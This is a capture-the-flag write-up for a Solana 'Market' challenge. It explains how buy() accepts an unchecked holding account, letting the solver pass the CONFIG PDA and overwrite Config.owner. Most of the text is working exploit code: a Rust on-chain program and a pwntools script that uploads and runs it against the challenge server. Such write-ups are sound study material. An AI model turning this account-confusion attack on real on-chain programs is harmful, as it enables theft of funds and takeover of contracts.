# Blockchain/Market

**Challenge**

**A market where the flag does not exist...**

**Solution**

**The flag is not an item in the market. The server gives it to us if the market's `Config.owner` becomes our public key.**

**The `buy()` function receives a `holding` account from the user. When that account already contains data, the program does not verify that it is the correct Holding PDA. It simply deserializes the supplied account as a `Holding` and updates its owner.**

```rust
let holding_data =
    &mut Holding::deserialize(&mut &holding.data.borrow()[..])?;

holding_data.owner = *user.key;
holding_data.item = *item.key;
holding_data.quantity += 1;
```

**Both `Holding` and `Config` store an owner public key as their first field. Therefore, we can pass the market's `CONFIG` PDA as the holding account.**

**Since `CONFIG` already contains data, the vulnerable branch interprets it as a `Holding` and overwrites `Config.owner` with our public key.**

**The exploit performs three actions:**

1. **Initialize our user account.**
2. **Deposit enough SOL to purchase the cheapest item.**
3. **Call `buy()`, but supply the `CONFIG` PDA as the holding account.**

**After the transaction, the server checks `Config.owner`, sees our public key, and returns:**

```text
Did you just steal the market from ME?? I SHALL BE BACK!
```

---

The original challenge service was no longer available during documentation, so the exploit code is included below as the reproducible technical artifact.

**Exploit code**

`solve/src/lib.rs` — the on-chain program submitted as the solve, run via CPI by the challenge's test harness:

```rust
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::invoke,
    pubkey::Pubkey,
};

use market::{buy, deposit, initialize_user};

entrypoint!(process_instruction);

fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let account_iter = &mut accounts.iter();

    let market_program = next_account_info(account_iter)?;
    let user = next_account_info(account_iter)?;
    let system_program = next_account_info(account_iter)?;
    let config = next_account_info(account_iter)?;
    let item0 = next_account_info(account_iter)?;
    let treasury = next_account_info(account_iter)?;
    let user_config = next_account_info(account_iter)?;

    let market_id = *market_program.key;

    let (user_config_pda, user_bump) =
        Pubkey::find_program_address(&[user.key.as_ref(), b"USER"], &market_id);
    let (config_pda, config_bump) = Pubkey::find_program_address(&[b"CONFIG"], &market_id);
    let (item0_pda, item0_bump) = Pubkey::find_program_address(&[b"RUBBERDUCK"], &market_id);
    let (treasury_pda, treasury_bump) = Pubkey::find_program_address(&[b"VAULT"], &market_id);

    assert_eq!(user_config_pda, *user_config.key);
    assert_eq!(config_pda, *config.key);
    assert_eq!(item0_pda, *item0.key);
    assert_eq!(treasury_pda, *treasury.key);

    // 1. create our user account
    invoke(
        &initialize_user(market_id, *user.key, user_config_pda, user_bump, 1337),
        &[user.clone(), user_config.clone(), system_program.clone()],
    )?;

    // 2. fund it with enough lamports to afford the Rubber Ducky (2 SOL)
    invoke(
        &deposit(market_id, *user.key, user_config_pda, user_bump, 2_100_000_000),
        &[user.clone(), user_config.clone(), system_program.clone()],
    )?;

    // 3. buy the Rubber Ducky (index 1337), but pass the CONFIG pda as
    //    `holding`. buy()'s else-branch (existing account) never checks
    //    that `holding` is the real [user, "HOLDING", item] PDA, so it
    //    happily deserializes CONFIG's bytes as a Holding{owner,item,quantity}
    //    and overwrites owner with *user.key -- i.e. Config.owner (same byte
    //    offset) becomes our pubkey.
    invoke(
        &buy(
            market_id,
            *user.key,
            user_config_pda,
            config_pda,   // system_config
            treasury_pda,
            config_pda,   // holding <- the bug
            item0_pda,    // item
            user_bump,
            config_bump,
            item0_bump,
            1337,         // item_id, must match item0's `index` field
            treasury_bump,
            0,            // holding_bump, unused on this code path
        ),
        &[
            user.clone(),
            user_config.clone(),
            config.clone(),
            treasury.clone(),
            config.clone(),
            item0.clone(),
            system_program.clone(),
        ],
    )?;

    Ok(())
}
```

`solve/exploit.py` — builds and uploads the program above, then triggers it against the remote:

```python
from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58
import os
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

os.system('cd .. && cd solve && cargo build-sbf')

r = remote(HOST, PORT)

solve = open('target/deploy/solve.so', 'rb').read()

r.recvuntil(b'program pubkey: ')
r.sendline(b'5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx')
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b'program: ')
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b'user: ')
user = PublicKey(base58.b58decode(r.recvline().strip().decode()))

log.info(f'market program: {program}')
log.info(f'user:           {user}')

config_pda, _ = PublicKey.find_program_address([b'CONFIG'], program)
item0_pda, _ = PublicKey.find_program_address([b'RUBBERDUCK'], program)
treasury_pda, _ = PublicKey.find_program_address([b'VAULT'], program)
user_config_pda, _ = PublicKey.find_program_address([bytes(user), b'USER'], program)

log.info(f'config:      {config_pda}')
log.info(f'item0:       {item0_pda}')
log.info(f'treasury:    {treasury_pda}')
log.info(f'user_config: {user_config_pda}')

input_payload = b''

accounts = [
    (b'x', program),
    (b'ws', user),
    (b'x', ID),
    (b'w', config_pda),
    (b'w', item0_pda),
    (b'w', treasury_pda),
    (b'w', user_config_pda),
]

r.recvuntil(b'num accounts: ')
r.sendline(str(len(accounts)).encode())
for flag, pubkey in accounts:
    r.sendline(flag + b' ' + str(pubkey).encode())

r.recvuntil(b'ix len: ')
r.sendline(str(len(input_payload)).encode())
r.send(input_payload)

print(r.recvall(timeout=5).decode())
```

**Flag**

**Not recoverable — the remote instance that would have printed it is no longer reachable.**
